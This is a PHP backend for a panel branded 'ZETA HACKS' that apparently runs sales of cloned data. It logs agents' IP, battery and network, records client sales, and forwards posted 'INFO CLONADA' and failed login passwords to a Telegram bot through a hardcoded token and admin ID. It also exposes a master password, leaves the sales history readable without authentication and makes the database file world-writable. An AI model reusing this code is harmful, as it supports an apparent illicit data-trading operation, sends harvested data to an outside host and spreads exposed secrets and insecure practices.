<?php
session_start();
date_default_timezone_set('America/La_Paz');

$token = "7990464918:AAFPoc7EYkZsyQEOntEfF1eC6V-WyBFAkaQ";
$admin_id = "7621351319"; 
$pass_maestra = "EmpresaPrivada2026";
$db_file = 'zeta_core_v12.json';

function gestionarDB($accion, $datos = null) {
    global $db_file;
    if (!file_exists($db_file)) { file_put_contents($db_file, json_encode(['ventas' => []])); chmod($db_file, 0777); }
    $db = json_decode(file_get_contents($db_file), true);
    if ($accion == 'guardar') { array_unshift($db['ventas'], $datos); if (count($db['ventas']) > 100) array_pop($db['ventas']); file_put_contents($db_file, json_encode($db)); return true; }
    return $db['ventas'];
}

function obtenerIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); return trim($ips[0]); }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function enviarTelegram($msg) {
    global $token, $admin_id;
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $admin_id, 'text' => $msg, 'parse_mode' => 'Markdown'];
    $options = ['http' => ['method' => 'POST', 'header' => "Content-type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)]];
    @file_get_contents($url, false, stream_context_create($options));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accion'])) {
    $accion = $_POST['accion'];
    $ip = obtenerIP();
    $bat = $_POST['bat'] ?? 'N/A';
    $net = $_POST['net'] ?? 'Desconocida';
    $ua = $_SERVER['HTTP_USER_AGENT'];

    if ($accion == 'login') {
        $p = trim($_POST['p']); $n = trim($_POST['n']);
        if ($p === $pass_maestra || $p === $admin_id) {
            $_SESSION['zeta_auth'] = true; $_SESSION['agente'] = $n;
            $msg = "🔱 *ZETA HACKS ONLINE*\n👤 Agente: `$n` \n🌐 IP: `{$ip}`\n🔋 Bat: `{$bat}`\n📶 Red: `{$net}`\n📍 [Ubicación](https://ip-api.com/#{$ip})\n📱 UA: `{$ua}`";
            enviarTelegram($msg);
            echo "ok";
        } else {
            enviarTelegram("⚠️ *ALERTA DE INTRUSO*\n🌐 IP: `{$ip}`\n🔑 Clave: `{$p}`\n📶 Red: `{$net}`");
            echo "error";
        }
    }

    if ($accion == 'registrar_ticket' && isset($_SESSION['zeta_auth'])) {
        $venta = ['fecha' => date('d/m H:i'), 'agente' => $_SESSION['agente'], 'cliente' => $_POST['c'], 'producto' => $_POST['p'], 'monto' => $_POST['m']];
        gestionarDB('guardar', $venta);
        enviarTelegram("🎫 *VENTA REGISTRADA*\n👤 Agente: `{$_SESSION['agente']}`\n💰 Monto: `{$_POST['m']}`\n🌐 IP: `{$ip}`");
        echo "ok";
    }

    if ($accion == 'obtener_historial') { echo json_encode(gestionarDB('leer')); }
    
    if ($accion == 'reportar_copiado' && isset($_SESSION['zeta_auth'])) {
        enviarTelegram("📋 *INFO CLONADA*\n👤 Agente: `{$_SESSION['agente']}`\n🔋 Bat: `{$bat}`\n🌐 IP: `{$ip}`\n\n" . $_POST['info']);
    }
    exit;
}
if (isset($_GET['salir'])) { session_destroy(); header("Location: index.php"); exit; }
?>
